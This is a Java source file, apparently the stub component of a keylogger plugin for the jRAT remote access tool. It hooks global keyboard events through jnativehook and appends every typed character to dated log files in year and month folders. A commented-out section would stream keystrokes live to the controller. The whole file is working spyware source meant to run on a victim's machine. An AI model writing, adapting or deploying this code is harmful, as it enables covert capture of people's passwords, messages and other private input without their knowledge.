package pro.jrat.plugin.stub;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.Date;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

@SuppressWarnings("deprecation")
public class Keylogger implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {		
		try {			
			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(getTodaysFile(), true)));
		    out.print(arg0.getKeyChar());
		    out.close();
			
			/*if (LIVE RUNNING && KeyloggerPlugin.dos != null) {
				Activities.add(new Key(arg0.getKeyChar()));
				System.out.println(arg0.getKeyChar());
			}*/
		} catch (Exception e) {
			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
		}

	}

	public static File getTodaysFile() {		
		Date date = new Date();
		
		File day = new File(getMonthFolder(), (date.getDate()) + ".log");
		
		return day;
	}
	
	public static File getMonthFolder() {
		Date date = new Date();

		File month = new File(getYearFolder(), (date.getMonth() + 1) + "");
		month.mkdirs();
			
		return month;
	}

	public static File getYearFolder() {
		Date date = new Date();

		File year = new File(KeyloggerPlugin.getLogsRoot(), (date.getYear() + 1900) + "");
		year.mkdirs();
		
		return year;
	}
}
